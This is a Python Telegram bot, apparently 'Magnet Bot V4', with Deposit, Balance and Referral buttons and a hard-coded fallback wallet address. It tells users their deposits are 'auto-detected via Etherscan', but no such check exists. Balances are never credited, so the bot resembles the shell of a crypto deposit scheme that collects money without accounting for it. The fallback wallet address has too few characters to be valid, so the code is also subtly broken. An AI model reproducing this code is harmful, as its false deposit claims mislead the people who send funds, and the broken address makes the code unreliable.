import os, time, threading, requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from flask import Flask

TOKEN = os.environ.get("BOT_TOKEN")
WALLET = os.environ.get("WALLET") or "0x53d9382d995095f7724832449902783187953"
ETHERSCAN_API_KEY = os.environ.get("ETHERSCAN_API_KEY")
users = {}

app = Flask(__name__)
@app.route('/')
def home():
    return "Bot Running V4 - Magnet Active"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in users:
        users[uid] = {"balance": 0}
    keyboard = [
        [InlineKeyboardButton("💰 Deposit", callback_data="deposit")],
        [InlineKeyboardButton("💳 Balance", callback_data="balance")],
        [InlineKeyboardButton("👥 Referral", callback_data="referral")]
    ]
    await update.message.reply_text(f"Welcome to Magnet Bot V4!\nYour Wallet: {WALLET}\n\nBot is Live ✅", reply_markup=InlineKeyboardMarkup(keyboard))

async def balance_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    bal = users.get(uid, {"balance": 0})["balance"]
    await update.message.reply_text(f"Balance: {bal}")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    d = q.data
    uid = q.from_user.id
    if d == "deposit":
        await q.message.reply_text(f"Send to: {WALLET}\n\nDeposit will be auto-detected via Etherscan.")
    elif d == "balance":
        bal = users.get(uid, {"balance": 0})["balance"]
        await q.message.reply_text(f"Balance: {bal}")
    elif d == "referral":
        uname = (await context.bot.get_me()).username
        await q.message.reply_text(f"Your link: https://t.me/{uname}?start={uid}")
    else:
        await q.message.reply_text("Plans coming soon")

def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))

if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    while True:
        try:
            print("Starting Bot polling... V4", flush=True)
            app_tg = Application.builder().token(TOKEN).build()
            app_tg.add_handler(CommandHandler("start", start))
            app_tg.add_handler(CommandHandler("balance", balance_cmd))
            app_tg.add_handler(CallbackQueryHandler(button_handler))
            app_tg.run_polling(drop_pending_updates=True)
        except Exception as e:
            print(f"Crashed {e}", flush=True)
            time.sleep(5)
